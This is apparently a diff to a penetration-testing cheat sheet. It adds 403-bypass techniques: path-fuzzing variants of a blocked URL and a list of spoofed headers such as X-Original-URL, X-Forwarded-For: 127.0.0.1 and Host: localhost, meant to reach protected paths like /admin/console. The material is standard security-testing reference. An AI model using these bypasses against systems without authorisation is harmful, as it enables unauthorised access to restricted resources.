@@ -137,6 +137,7 @@ sqldump.sql
 - try /%2e/path or /%252e/path (this could bypass the protection by proxy)
 - Try Unicode bypass:/%ef%bc%8fpath
 
+- path fuzzing (If /path is blocked):
 site.com/secret –> HTTP 403 Forbidden
 site.com/SECRET –> HTTP 200 OK
 site.com/secret/ –> HTTP 200 OK
@@ -147,8 +148,25 @@ site.com/;/secret –> HTTP 200 OK
 site.com/.;/secret –> HTTP 200 OK
 site.com//;//secret –> HTTP 200 OK
 site.com/secret.json –> HTTP 200 OK (ruby)
-  
 
+- using headers
+X-Original-URL: /admin/console
+X-Rewrite-URL: /admin/console
+
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded: 127.0.0.1
+Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Original-URL: 127.0.0.1
+Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+Host: localhost
+  
 ```
 
 ## fingerprinting
